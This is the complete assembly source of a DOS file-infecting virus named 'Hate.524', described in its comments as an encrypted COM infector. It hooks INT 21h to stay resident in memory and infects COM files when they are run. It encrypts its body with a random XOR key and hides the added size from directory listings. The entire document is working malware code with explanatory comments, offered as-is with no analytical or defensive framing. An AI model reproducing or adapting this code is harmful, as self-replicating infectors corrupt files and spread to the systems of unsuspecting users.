; Hate.524 (named by Moi because of Internal Text and Size)
; Uninteresting Encrypted COM Infector
; Source code compliments of PakiLad
p386n


seg000          segment byte public 'CODE' use16
                assume cs:seg000
                org 100h
                assume es:nothing, ss:nothing, ds:seg000, fs:nothing, gs:nothing

start           proc near
                and     al, 21h
                mov     ax, 5800h
                int     21h             ; Virus Installation Check
                cmp     ah, 58h         ; Installed Already?
                jnz     InstallVirus    ; No? Then JMP.
                mov     ah, 4Ch
                int     21h             ; Exit To DOS

InstallVirus:
                call    $+3
start           endp

Next            proc near
                pop     si
                sub     si, offset Next
                mov     dl, Cryptor[si]
                cmp     dl, 0
                jz      Crypted
                mov     cx, VirusSize
                lea     di, Crypted[si]

DecryptLoop:
                mov     al, [di]
                xor     al, dl
                mov     [di], al
                inc     di
                loop    DecryptLoop

Crypted:
                mov     ah, 14h
                int     21h             ; Install Check
                cmp     ah, 6           ; Installed?
                jz      RestoreCOM      ; Yes? Then JMP.
                jmp     short DoInstall

RestoreCOM:
                push    cs
                pop     ds
                mov     ax, OrgByte1[si]
                mov     word ptr start, ax
                mov     ax, OrgByte2[si]
                mov     word ptr ds:102h, ax
                mov     al, OrgByte3[si]
                mov     byte ptr ds:104h, al
                mov     ax, offset start
                push    ax
                retn                    ; Return to Original Program

DoInstall:
                mov     ah, 52h
                int     21h             ; Get List Of Lists
                mov     bx, es:[bx-2]

FindLastMCB:
                mov     es, bx
                add     bx, es:3
                inc     bx
                cmp     byte ptr es:0, 'Z' ; Last MCB?
                jnz     FindLastMCB     ; No? Then JMP.
                mov     ax, es
                mov     es, bx
                cmp     byte ptr es:0, 'M' ; More MCB To Follow?
                jz      GotMoreMCB      ; Yes? Then JMP.
                mov     es, ax          ; ES points to MCB
                jmp     short GotMemory

GotMoreMCB:
                mov     es, bx
                add     bx, es:3
                inc     bx
                cmp     byte ptr es:0, 'M'
                jz      GotMoreMCB

GotMemory:
                mov     bx, es:3
                mov     ax, 795
                mov     cl, 4
                shr     ax, cl
                sub     bx, ax
                mov     es:3, bx
                mov     ax, es
                add     bx, ax
                xor     di, di
                mov     es, bx
                mov     cx, TotalSize+100h
                push    si
                rep movsb               ; Copy Virus Into Memory
                pop     si
                push    es
                pop     ds
                mov     ax, 3521h
                int     21h             ; Get Int 21h Vectors
                mov     Int21Ofs, bx
                mov     Int21Seg, es
                mov     ah, 25h
                mov     dx, offset NewInt21
                int     21h             ; Set New Int 21h Vectors
                jmp     RestoreCOM
Next            endp


NewInt21:                               ; Install Check?
                cmp     ah, 14h
                jnz     CheckExecute    ; No? Then JMP.
                mov     ah, 6           ; I'm Here!
                iret    

CheckExecute:                           ; Set Execution State?
                cmp     ah, 4Bh
                jnz     CheckFCBFind    ; No? Then JMP.
                jmp     short InfectFile

CheckFCBFind:                           ; Find First File (FCB)?
                cmp     ah, 11h
                jz      FindFileFCB     ; Yes? Then JMP.
                cmp     ah, 12h         ; Find Next File (FCB)?
                jnz     DoOriginalFunc  ; No? Then JMP.

FindFileFCB:
                call    CallInt21
                pushf   
                pusha   
                push    es
                cmp     al, 0           ; None found?
                jnz     NoFilesFound    ; No? Then JMP.
                mov     ah, 2Fh
                call    CallInt21       ; Get DTA Segment/Offset
                cmp     byte ptr es:[bx], 0FFh ; Extended FCB?
                jnz     NotExtFCB       ; No? Then JMP.
                add     bx, 7

NotExtFCB:
                mov     al, es:[bx+17h]
                and     al, 1Fh
                cmp     al, 1Fh         ; Infected Already?
                jnz     NoFilesFound    ; No? Then JMP.
                sub     word ptr es:[bx+1Dh], TotalSize ; Fix FileSize

NoFilesFound:
                pop     es
                popa    
                popf    
                iret    

DoOriginalFunc:
                jmp     short $+2
JMPFar21        db 0EAh
Int21Ofs        dw 0
Int21Seg        dw 0

InfectFile:
                pusha   
                push    es
                push    ds
                mov     ax, 3D02h
                call    CallInt21       ; Open File
                jnb     FileOpened      ; No problems? Then JMP.
                jmp     CloseFile

FileOpened:
                xchg    ax, bx
                push    cs
                pop     ds              ; DS = CS
                mov     ah, 3Fh
                mov     cx, 5
                mov     dx, offset OrgByte1
                call    CallInt21       ; Read In 5 Bytes
                mov     ax, OrgByte1
                add     ah, al
                cmp     ah, 0A7h        ; Infected Already?
                jnz     NotBad1         ; No? Then JMP.
                jmp     CloseFile

NotBad1:                                ; Infected Already?
                cmp     ah, 45h
                jnz     NoSigFound      ; No? Then JMP.
                jmp     CloseFile

NoSigFound:
                mov     ax, 5700h
                call    CallInt21       ; Get File Date/Time
                push    cx
                push    dx
                and     cx, 1Fh
                cmp     cx, 1Fh         ; Infected Already?
                jnz     MovePtrEnd      ; No? Then JMP.
                pop     dx
                pop     cx
                jmp     short CloseFile

MovePtrEnd:
                mov     ax, 4202h
                xor     cx, cx
                cwd     
                call    CallInt21       ; Move Pointer to End of File
                sub     ax, 3           ; Calculate JMP Offset
                mov     JMPOffset, ax
                mov     ah, 40h
                mov     cx, CryptSize
                mov     dx, offset start
                call    CallInt21       ; Write Crypt Routine to File
                mov     cx, VirusSize
                mov     si, offset Crypted
                mov     di, offset EndOfVirus
                mov     ax, 8F20h
                push    es
                push    ax
                pop     es
                assume es:nothing
                in      al, 40h         ; Get Random Number
                xchg    al, dl
                mov     Cryptor, dl

EncryptVirus:
                mov     al, [si]
                xor     al, dl
                mov     es:[di], al
                inc     si
                inc     di
                loop    EncryptVirus
                mov     cx, 1

EncryptSecond:
                mov     al, [si]
                mov     es:[di], al
                inc     si
                inc     di
                loop    EncryptSecond
                pop     es
                assume es:nothing
                push    ds
                mov     ax, 8F20h
                push    ax
                pop     ds
                assume ds:nothing
                mov     ah, 40h
                mov     cx, VirusSize2
                mov     dx, offset EndOfVirus
                call    CallInt21       ; Write Encrypted Virus To File
                pop     ds
                assume ds:seg000
                mov     ax, 4200h
                xor     cx, cx
                cwd     
                call    CallInt21       ; Move Pointer to Beginning
                mov     ah, 40h
                mov     cl, 5
                mov     dx, offset InfMarker
                call    CallInt21       ; Write JMP And Infection Marker
                pop     dx
                pop     cx
                or      cx, 1Fh
                mov     ax, 5701h
                call    CallInt21       ; Fix File Date/Time

CloseFile:
                mov     ah, 3Eh
                call    CallInt21       ; Close File
                pop     ds
                pop     es
                popa    
                jmp     near ptr JMPFar21

CallInt21       proc near
                pushf   
                call    dword ptr cs:Int21Ofs
                retn    
CallInt21       endp

OrgByte1        dw 2124h
OrgByte2        dw 20CDh
OrgByte3        db 0
InfMarker       dw 2124h
JMPInstruction  db 0E9h
JMPOffset       dw 0
VirusName       db 'THIS IS [HATE V1.0] VIRUS$'

Cryptor         db 0
EndOfVirus:
CryptSize       equ Crypted - start
VirusSize       equ Cryptor - Crypted
VirusSize2      equ $ - Crypted
TotalSize       equ $ - start
seg000          ends


                end start
